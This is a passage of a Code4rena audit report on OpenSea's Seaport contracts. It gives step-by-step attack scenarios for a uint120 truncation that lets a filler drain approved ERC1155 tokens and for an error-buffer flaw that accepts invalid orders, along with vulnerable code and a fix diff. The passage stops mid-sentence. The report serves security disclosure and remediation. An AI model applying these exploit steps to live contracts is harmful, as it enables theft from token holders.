{
  "circa": {
    "title": "OpenSea Seaport contest",
    "sponsor": "OpenSea",
    "slug": "2022-05-opensea-seaport",
    "date": "2022-08-30",
    "findings": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues",
    "contest": 128
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the OpenSea Seaport smart contract system written in Solidity. The audit contest took place between May 20—June 3 2022.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>65 Wardens contributed reports to the OpenSea Seaport contest:</p>\n<ol>\n<li><a href=\"https://spearbit.com/\">Spearbit</a></li>\n<li><a href=\"https://www.sawmon-and-natalie.com/\">Saw-mon_and_Natalie</a></li>\n<li><a href=\"https://twitter.com/cmichelio\">cmichel</a></li>\n<li><a href=\"https://github.com/0xsanson\">0xsanson</a></li>\n<li><a href=\"https://twitter.com/frangio_\">frangio</a></li>\n<li>broccoli (<a href=\"https://github.com/x9453\">shw</a> and <a href=\"https://twitter.com/jonah1005w\">jonah1005</a>)</li>\n<li><a href=\"https://twitter.com/ori_dabush\">OriDabush</a></li>\n<li><a href=\"https://twitter.com/0xhyh\">hyh</a></li>\n<li><a href=\"https://github.com/mingwatch\">ming</a></li>\n<li><a href=\"https://www.linkedin.com/in/yardenporat1/\">Yarpo</a></li>\n<li>IllIllI</li>\n<li><a href=\"https://twitter.com/shunduquar\">shung</a></li>\n<li><a href=\"https://chom.dev\">Chom</a></li>\n<li><a href=\"https://twitter.com/BowTiedDravee\">Dravee</a></li>\n<li>zkhorse (<a href=\"twitter.com/0xkarmacoma\">karmacoma</a> and horsefacts)</li>\n<li>sces60107</li>\n<li>peritoflores</li>\n<li><a href=\"https://twitter.com/HickupH\">hickuphh3</a></li>\n<li><a href=\"https://twitter.com/hack3r_0m\">hack3r-0m</a></li>\n<li>ilan</li>\n<li>cccz</li>\n<li><a href=\"https://twitter.com/csanuragjain\">csanuragjain</a></li>\n<li><a href=\"https://www.instagram.com/riyan_rfa/\">rfa</a></li>\n<li>oyc_109</li>\n<li>twojoy</li>\n<li><a href=\"https://twitter.com/0xfoobar\">foobar</a></li>\n<li>mayo</li>\n<li>scaraven</li>\n<li>kebabsec (okkothejawa and <a href=\"https://twitter.com/FlameHorizon1\">FlameHorizon</a>)</li>\n<li>sorrynotsorry</li>\n<li>zzzitron</li>\n<li>tintin</li>\n<li>hubble (ksk2345 and shri4net)</li>\n<li>0x1f8b</li>\n<li>NoamYakov</li>\n<li>djxploit</li>\n<li><a href=\"https://twitter.com/0xalpharush\">0xalpharush</a></li>\n<li><a href=\"https://twitter.com/_Czar102\">Czar102</a></li>\n<li>0x29A (0x4non and rotcivegaf)</li>\n<li><a href=\"https://twitter.com/SirH4shalot\">sirhashalot</a></li>\n<li><a href=\"https://twitter.com/gzeon\">gzeon</a></li>\n<li><a href=\"https://twitter.com/MaratCerby\">MaratCerby</a></li>\n<li><a href=\"https://twitter.com/zer0dots\">zer0dot</a></li>\n<li><a href=\"https://twitter.com/defsec_\">defsec</a></li>\n<li>Hawkeye (0xwags and 0xmint)</li>\n<li><a href=\"https://twitter.com/0xheynacho\">ignacio</a></li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li><a href=\"https://milotruck.github.io/\">MiloTruck</a></li>\n<li>sashik_eth</li>\n<li><a href=\"https://twitter.com/0xKaden\">kaden</a></li>\n<li>sach1r0</li>\n<li><a href=\"https://mobile.twitter.com/tomj_bb\">TomJ</a></li>\n<li><a href=\"https://twitter.com/ellahinator\">ellahi</a></li>\n<li>TerrierLover</li>\n<li>asutorufos</li>\n<li>delfin454000</li>\n<li>hake</li>\n<li>RoiEvenHaim</li>\n<li><a href=\"https://github.com/htadashi\">Tadashi</a></li>\n</ol>\n<p>This contest was judged by <a href=\"https://twitter.com/liam_eastwood13\">0xleastwood</a> and <a href=\"https://twitter.com/HardlyDifficult\">HardlyDifficult</a>. Additional judging assistance provided by <a href=\"https://twitter.com/GalloDaSballo\">Alex the Entreprenerd</a> for reports detailing low risk and non-critical issues.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 4 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 2 received a risk rating in the category of MEDIUM severity. Per OpenSea, all of these HIGH and MEDIUM severity findings have been addressed via Seaport 1.1. (see specific mitigations linked on each finding in the sections below)</p>\n<p>Additionally, C4 analysis included 29 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 45 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>Seaport 1.0 was the focus of this audit contest. The code under review can be found within the <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport\">C4 OpenSea Seaport contest repository</a>, and is composed of 44 smart contracts written in the Solidity programming language and includes 9,771 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>.</p>\n<h1 id=\"high-risk-findings-2\" style=\"position:relative;\"><a href=\"#high-risk-findings-2\" aria-label=\"high risk findings 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (2)</h1>\n<h2 id=\"h-01-truncation-in-ordervalidator-can-lead-to-resetting-the-fill-and-selling-more-tokens\" style=\"position:relative;\"><a href=\"#h-01-truncation-in-ordervalidator-can-lead-to-resetting-the-fill-and-selling-more-tokens\" aria-label=\"h 01 truncation in ordervalidator can lead to resetting the fill and selling more tokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/77\">[H-01] Truncation in <code>OrderValidator</code> can lead to resetting the fill and selling more tokens</a></h2>\n<p><em>Submitted by Spearbit, also found by 0xsanson, broccoli, cmichel, hyh, ming, OriDabush, Saw-mon_and_Natalie, and Yarpo</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L228\">OrderValidator.sol#L228</a><br>\n<a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L231\">OrderValidator.sol#L231</a><br>\n<a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L237\">OrderValidator.sol#L237</a><br>\n<a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L238\">OrderValidator.sol#L238</a><br></p>\n<p>A partial order’s fractions (<code>numerator</code> and <code>denominator</code>) can be reset to <code>0</code> due to a truncation. This can be used to craft malicious orders:</p>\n<ol>\n<li>Consider user Alice, who has 100 ERC1155 tokens, who approved all of their tokens to the <code>marketplaceContract</code>.</li>\n<li>Alice places a <code>PARTIAL_OPEN</code> order with 10 ERC1155 tokens and consideration of ETH.</li>\n<li>\n<p>Malory tries to fill the order in the following way:</p>\n<ol>\n<li>Malory tries to fill 50% of the order, but instead of providing the fraction <code>1 / 2</code>, Bob provides <code>2**118 / 2**119</code>. This sets the <code>totalFilled</code> to <code>2**118</code> and <code>totalSize</code> to <code>2**119</code>.</li>\n<li>Malory tries to fill 10% of the order, by providing <code>1 / 10</code>. The computation <code>2**118 / 2**119 + 1 / 10</code> is done by “cross multiplying” the denominators, leading to the acutal fraction being <code>numerator = (2**118 * 10 + 2**119)</code> and <code>denominator = 2**119 * 10</code>.</li>\n<li>Because of the <code>uint120</code> truncation in <a href=\"https://github.com/ProjectOpenSea/seaport/blob/6c24d09fc4be9bbecf749e6a7a592c8f7b659405/contracts/lib/OrderValidator.sol#L228-L248\">OrderValidator.sol#L228-L248</a>, the <code>numerator</code> and <code>denominator</code> are truncated to <code>0</code> and <code>0</code> respectively.</li>\n<li>Bob can now continue filling the order and draining any approved (1000 tokens in total) of the above ERC1155 tokens, for the same consideration amount!</li>\n</ol>\n</li>\n</ol>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>View <a href=\"https://gist.github.com/hrkrshnn/7c51b23f7c43c55ba0f8157c3b298409\">full POC</a>.</p>\n<p>The following change would make the above POC fail:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">modified   contracts/lib/OrderValidator.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -225,6 +225,8 @@ contract OrderValidator is Executor, ZoneInteraction {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // Update order status and fill amount, packing struct values.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 _orderStatus[orderHash].isValidated = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 _orderStatus[orderHash].isCancelled = false;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                require(filledNumerator + numerator &lt;= type(uint120).max, &quot;overflow&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                require(denominator &lt;= type(uint120).max, &quot;overflow&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 _orderStatus[orderHash].numerator = uint120(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     filledNumerator + numerator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -234,6 +236,8 @@ contract OrderValidator is Executor, ZoneInteraction {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Update order status and fill amount, packing struct values.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             _orderStatus[orderHash].isValidated = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             _orderStatus[orderHash].isCancelled = false;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            require(numerator &lt;= type(uint120).max, &quot;overflow&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            require(denominator &lt;= type(uint120).max, &quot;overflow&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             _orderStatus[orderHash].numerator = uint120(numerator);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             _orderStatus[orderHash].denominator = uint120(denominator);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>A basic fix for this would involve adding the above checks for overflow / truncation and reverting in that case. However, we think the mechanism is still flawed in some respects and requires more changes to fully fix it. See a related issue: <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/101\">“A malicious filler can fill a partial order in such a way that the rest cannot be filled by anyone”</a> that points out a related but a more fundamental issue with the mechanism.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/77\">0age (OpenSea) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/77#issuecomment-1162425341\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I’ve identified that this issue and all of its duplicates clearly outline how an attacker might overflow an order to continually fulfill an order at the same market price.</p>\n<p>An instance where this issue might cause issues is during a restricted token sale. A relevant scenario is detailed as follows:</p>\n<ul>\n<li>A new token is created and the owner wishes to sell 50% of the token supply to the public.</li>\n<li>Because of an edge case in <code>OrderValidator</code>, the order fulfillment can be reset to allow the public to more than 50% of the total token supply.</li>\n<li>As a result, allocations intended to be distributed to investors and the team, will no longer be available.</li>\n<li>It is important to note, that additional tokens will be sold at the intended market price listed by the original order.</li>\n</ul>\n<p>For these reasons, I believe this issue to be of high severity because it breaks certain trust assumptions made by the protocol and its userbase. By intentionally forcing a user to sell additional tokens, you are effectively altering the allocation of their wallet holdings, potentially leading to further funds loss as they may incur slippage when they have to sell these tokens back.</p>\n<p>A great finding from all involved!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/77\">0age (OpenSea) resolved</a>:</strong></p>\n<blockquote>\n<p>PR: <a href=\"https://github.com/ProjectOpenSea/seaport/pull/319\">ProjectOpenSea/seaport#319</a></p>\n</blockquote>\n<hr>\n<h2 id=\"h-02-_aggregatevalidfulfillmentofferitems-can-be-tricked-to-accept-invalid-inputs\" style=\"position:relative;\"><a href=\"#h-02-_aggregatevalidfulfillmentofferitems-can-be-tricked-to-accept-invalid-inputs\" aria-label=\"h 02 _aggregatevalidfulfillmentofferitems can be tricked to accept invalid inputs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/75\">[H-02] <code>_aggregateValidFulfillmentOfferItems()</code> can be tricked to accept invalid inputs</a></h2>\n<p><em>Submitted by Spearbit, also found by Saw-mon_and_Natalie</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L406\">FulfillmentApplier.sol#L406</a><br></p>\n<p>The <code>_aggregateValidFulfillmentOfferItems()</code> function aims to revert on orders with zero value or where a total consideration amount overflows. Internally this is accomplished by having a temporary variable <code>errorBuffer</code>, accumulating issues found, and only reverting once all the items are processed in case there was a problem found. This code is optimistic for valid inputs.</p>\n<p>Note: there is a similar issue in <code>_aggregateValidFulfillmentConsiderationItems()</code>, which is reported separately.</p>\n<p>The problem lies in how this <code>errorBuffer</code> is updated:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// Update error buffer (1 = zero amount, 2 = overflow).</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                errorBuffer := </span><span class=\"mtk11\">or</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                  </span><span class=\"mtk12\">errorBuffer</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                  </span><span class=\"mtk11\">or</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk11\">shl</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk11\">lt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk11\">iszero</span><span class=\"mtk1\">(</span><span class=\"mtk11\">mload</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amountPtr</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                )</span></span></span></code></pre>\n<p>The final error handling code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Determine if an error code is contained in the error buffer.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">switch</span><span class=\"mtk1\"> </span><span class=\"mtk12\">errorBuffer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">case</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// Store the MissingItemAmount error signature.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">mstore</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MissingItemAmount_error_signature</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// Return, supplying MissingItemAmount signature.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MissingItemAmount_error_len</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">case</span><span class=\"mtk1\"> </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// If the sum overflowed, panic.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">throwOverflow</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span></code></pre>\n<p>While the expected value is <code>0</code> (success),  <code>1</code> or <code>2</code> (failure), it is possible to set it to <code>3</code>, which is unhandled and considered as a “success”. This can be easily accomplished by having both an overflowing item and a zero item in the order list.</p>\n<p>This validation error could lead to fulfilling an order with a consideration (potentially ~0) lower than expected.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Craft an offer containing two errors (e.g. with  zero amount and 